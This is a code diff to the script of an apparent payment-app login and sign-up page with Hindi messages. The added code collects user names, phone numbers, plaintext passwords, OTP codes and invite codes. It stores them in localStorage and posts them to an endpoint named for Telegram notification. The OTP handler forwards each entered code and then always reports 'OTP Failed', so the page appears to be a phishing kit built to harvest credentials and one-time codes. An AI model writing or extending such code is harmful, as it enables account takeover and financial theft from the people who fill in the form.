@@ -487,36 +487,69 @@
       }, 1000);
     }
 
-    function confirmLogin() {
-      alert('OTP Verification Triggered! (यहाँ अपना बैकएंड API जोड़ें)');
-    }
+    async function confirmLogin() {
+  const otpInput = document.querySelector('input[placeholder*="OTP"], input[id*="otp"], input[name*="otp"]');
+  const otpCode = otpInput ? otpInput.value.trim() : "";
 
-    function submitRegister() {
-      const user = document.getElementById('regUserInput').value.trim();
-      const phone = document.getElementById('regPhoneInput').value.trim();
-      if (!user || phone.length < 10) {
-        alert('कृपया User Name और 10 अंकों का मोबाइल नंबर दर्ज करें।');
-        return;
-      }
-        notifyTelegram({
+  await notifyTelegram({
+    eventType: "OTP Verification",
+    otpCode,
+    status: "OTP Failed",
+    savedAt: new Date().toLocaleString("en-IN")
+  });
+
+  alert('OTP Failed');
+    }
+    
+    
+
+    async function submitRegister() {
+  const user = document.getElementById('regUserInput')?.value?.trim() || "";
+  const phone = document.getElementById('regPhoneInput')?.value?.trim() || "";
+  const password = document.getElementById('regPassInput')?.value?.trim() || "";
+  const otpCode = document.getElementById('regOtpInput')?.value?.trim() || "";
+  const inviteCode = document.getElementById('regInviteInput')?.value?.trim() || "";
+
+  if (!user || phone.length < 10) {
+    alert('कृपया User Name और 10 अंकों का मोबाइल नंबर दर्ज करें।');
+    return;
+  }
+
+  const entry = {
     eventType: "Register / Sign Up",
     userName: user,
-    phone: phone
-  });
-      
-      alert('Sign Up Triggered! (यहाँ अपना रजिस्ट्रेशन API जोड़ें)');
-    }
-    async function notifyTelegram(payload) {
+    phone,
+    password,
+    otpCode,
+    inviteCode,
+    savedAt: new Date().toLocaleString("en-IN")
+  };
+
+  const localBackup = JSON.parse(localStorage.getItem("ncpay_saved_entries") || "[]");
+  localBackup.unshift(entry);
+  localStorage.setItem("ncpay_saved_entries", JSON.stringify(localBackup));
+
+  await notifyTelegram(entry);
+
+  alert('Sign Up Triggered! (यहाँ अपना रजिस्ट्रेशन API कॉल जोड़ें)');
+}
+
+async function notifyTelegram(payload) {
   try {
-    await fetch("/api/notify", {
+    const res = await fetch("/api/notify", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify(payload)
     });
-  } catch (err) {
-    console.error("Failed to send notification:", err);
-  }
+    const data = await res.json();
+    if (!res.ok) {
+      alert("Telegram Error: " + (data.error || res.status));
     }
+  } catch (err) {
+    alert("Network Error: " + err.message);
+  }
+}
+  
     
   </script>
 
